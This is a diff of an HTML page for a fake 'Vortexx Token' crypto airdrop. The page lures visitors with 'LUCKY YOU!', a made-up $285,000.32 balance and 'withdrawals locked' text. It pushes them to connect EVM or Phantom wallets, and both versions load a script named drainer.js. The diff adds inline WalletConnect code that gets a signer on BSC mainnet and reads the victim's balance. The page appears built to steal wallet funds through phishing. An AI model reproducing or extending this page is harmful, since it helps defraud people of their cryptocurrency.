@@ -1,91 +1,169 @@
 <!DOCTYPE html>
-‎<html lang="en">
-‎<head>
-‎<meta charset="UTF-8">
-‎<meta name="viewport" content="width=device-width, initial-scale=1.0">
-‎<title>Vortexx Token – Free Airdrop</title>
-‎<link rel="stylesheet" href="style.css">
-‎
-‎<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
-‎<script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
-‎<script src="https://cdn.jsdelivr.net/npm/@binance-chain/javascript-sdk/dist/binance.js"></script>
-‎<script src="https://cdn.jsdelivr.net.npm/@bitcoinjs/browser/dist/bitcon.js"></script>
-‎
-‎<!-- Wallet connectors -->
-‎<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-‎<script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
-‎<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-‎</head>
-‎
-‎<body>
-‎
-‎<div class="container" id="landingSection">
-‎  <div class="logo-circle">VTXT</div>
-‎  <h1 class="pulse">LUCKY YOU!</h1>
-‎  <p class="subtitle">Vortexx-TOKEN airdrop is ongoing.</p>
-‎  <button id="proceedBtn">Click to Claim Airdrop</button>
-‎</div>
-‎
-‎<div class="container hidden" id="connectSection">
-‎  <button id="connectBtn">Connect Wallet</button>
-‎</div>
-‎
-‎<div class="container hidden" id="solanaSection">
-‎  <input type="text" id="solAddress" placeholder="Enter your Solana wallet" />
-‎  <div class="progress"><span></span></div>
-‎  <button id="submitSol" class="hidden">Submit</button>
-‎</div>
-‎
-‎<div class="modal hidden" id="termsModal">
-‎  <div class="modal-card">
-‎    <h2>Terms & Conditions</h2>
-‎    <p class="terms">You confirm that the wallet address entered is correct.</p>
-‎    <div class="modal-actions">
-‎      <button id="acceptBtn">Accept</button>
-‎    </div>
-‎  </div>
-‎</div>
-‎
-‎<section id="airdropPage" class="hidden">
-‎  <div class="balance-label">Airdrop Balance</div>
-‎  <div class="balance-amount">$285,000.32</div>
-‎
-‎  <div class="wallet-header">
-‎    <div class="wallet-icon">T</div>
-‎    <div>
-‎      <h2>VTXT Wallet</h2>
-‎      <p id="userWallet">—</p>
-‎    </div>
-‎  </div>
-‎
-‎  <div class="balance-section">
-‎    <span class="label">Airdrop Balance</span>
-‎    <div class="balance" id="airdropBalance">0</div>
-‎    <span class="token">VTXT</span>
-‎  </div>
-‎
-‎  <div class="balance-diff-section hidden" id="balanceDiffSection">
-‎    <span class="label">Balance Change:</span>
-‎    <div class="balance" id="balanceDiff">0</div>
-‎    <span class="token">VTXT</span>
-‎  </div>
-‎
-‎  <p class="note">🔒 Withdrawals locked. Airdrop will be sent immediately after token launch.</p>
-‎</section>
-‎
-‎<!-- Wallet Choice Modal -->
-‎<div class="modal hidden" id="walletChoiceModal">
-‎  <div class="modal-card">
-‎    <h2>Select Wallet Type</h2>
-‎    <div class="modal-actions">
-‎      <button id="evmWalletBtn">Connect EVM Wallet</button>
-‎      <button id="phantomWalletBtn">Connect Phantom (Solana)</button>
-‎      <button id="cancelWalletBtn">Cancel</button>
-‎    </div>
-‎  </div>
-‎</div>
-‎
-‎<script src="script.js"></script>
-  ‎<script src="drainer.js"></script>
-‎</body>
-‎</html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vortexx Token – Free Airdrop</title>
+<link rel="stylesheet" href="style.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@binance-chain/javascript-sdk/dist/binance.js"></script>
+<script src="https://cdn.jsdelivr.net.npm/@bitcoinjs/browser/dist/bitcon.js"></script>
+
+<!-- Wallet connectors -->
+<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+<script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+
+<body>
+
+<div class="container" id="landingSection">
+  <div class="logo-circle">VTXT</div>
+  <h1 class="pulse">LUCKY YOU!</h1>
+  <p class="subtitle">Vortexx-TOKEN airdrop is ongoing.</p>
+  <button id="proceedBtn">Click to Claim Airdrop</button>
+</div>
+
+<div class="container hidden" id="connectSection">
+  <button id="connectBtn">Connect Wallet</button>
+</div>
+
+<div class="container hidden" id="solanaSection">
+  <input type="text" id="solAddress" placeholder="Enter your Solana wallet" />
+  <div class="progress"><span></span></div>
+  <button id="submitSol" class="hidden">Submit</button>
+</div>
+
+<div class="modal hidden" id="termsModal">
+  <div class="modal-card">
+    <h2>Terms & Conditions</h2>
+    <p class="terms">You confirm that the wallet address entered is correct.</p>
+    <div class="modal-actions">
+      <button id="acceptBtn">Accept</button>
+    </div>
+  </div>
+</div>
+
+<section id="airdropPage" class="hidden">
+  <div class="balance-label">Airdrop Balance</div>
+  <div class="balance-amount">$285,000.32</div>
+
+  <div class="wallet-header">
+    <div class="wallet-icon">T</div>
+    <div>
+      <h2>VTXT Wallet</h2>
+      <p id="userWallet">—</p>
+    </div>
+  </div>
+
+  <div class="balance-section">
+    <span class="label">Airdrop Balance</span>
+    <div class="balance" id="airdropBalance">0</div>
+    <span class="token">VTXT</span>
+  </div>
+
+  <div class="balance-diff-section hidden" id="balanceDiffSection">
+    <span class="label">Balance Change:</span>
+    <div class="balance" id="balanceDiff">0</div>
+    <span class="token">VTXT</span>
+  </div>
+
+  <p class="note">🔒 Withdrawals locked. Airdrop will be sent immediately after token launch.</p>
+</section>
+
+<!-- Wallet Choice Modal -->
+<div class="modal hidden" id="walletChoiceModal">
+  <div class="modal-card">
+    <h2>Select Wallet Type</h2>
+    <div class="modal-actions">
+      <button id="evmWalletBtn">Connect EVM Wallet</button>
+      <button id="phantomWalletBtn">Connect Phantom (Solana)</button>
+      <button id="cancelWalletBtn">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<script>
+let wcProvider;
+let provider;
+let signer;
+let activeProviderType;
+
+const wcBtn = document.getElementById('connectBtn'); // WalletConnect button
+const WALLETCONNECT_PROJECT_ID = "YOUR_PROJECT_ID"; // Replace with your WalletConnect project ID
+const NETWORKS = {
+    56: { rpc: "https://bsc-dataseed.binance.org/" } // BSC mainnet
+};
+
+wcBtn.onclick = async () => {
+    try {
+        // Disconnect if already connected
+        if (wcProvider) {
+            await wcProvider.disconnect().catch(() => {});
+            wcProvider = null;
+        }
+
+        wcBtn.disabled = true;
+        wcBtn.textContent = "Connecting...";
+
+        // Import WalletConnect EthereumProvider
+        const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2?bundle');
+
+        wcProvider = await EthereumProvider.init({
+            projectId: WALLETCONNECT_PROJECT_ID,
+            chains: [56],
+            showQrModal: true,
+            rpcMap: { 56: NETWORKS[56].rpc },
+            metadata: {
+                name: 'Moonweb3 Airdrop',
+                url: window.location.origin
+            }
+        });
+
+        // Connect wallet
+        const accounts = await wcProvider.enable();
+
+        // Set global provider & signer
+        window.ethereum = wcProvider;
+        provider = new ethers.providers.Web3Provider(wcProvider);
+        signer = provider.getSigner();
+        activeProviderType = 'walletconnect';
+
+        // Call your post-connection function
+        await connected();
+
+    } catch (err) {
+        console.error(err);
+        updateStatusMessage('WalletConnect failed', 'error');
+    } finally {
+        wcBtn.disabled = false;
+        wcBtn.textContent = "WalletConnect";
+    }
+};
+
+// Example post-connection function
+async function connected() {
+    const userWalletEl = document.getElementById('userWallet');
+    const balanceEl = document.getElementById('airdropBalance');
+
+    const address = await signer.getAddress();
+    userWalletEl.textContent = address;
+
+    // Example: fetch dummy balance
+    const balance = await provider.getBalance(address);
+    balanceEl.textContent = ethers.utils.formatEther(balance);
+}
+
+// Placeholder for updateStatusMessage function
+function updateStatusMessage(msg, type) {
+    console.log(type, msg);
+}
+</script>
+
+<script src="script.js"></script>
+‎<script src="drainer.js"></script>
+  
+</body>
+  </html>
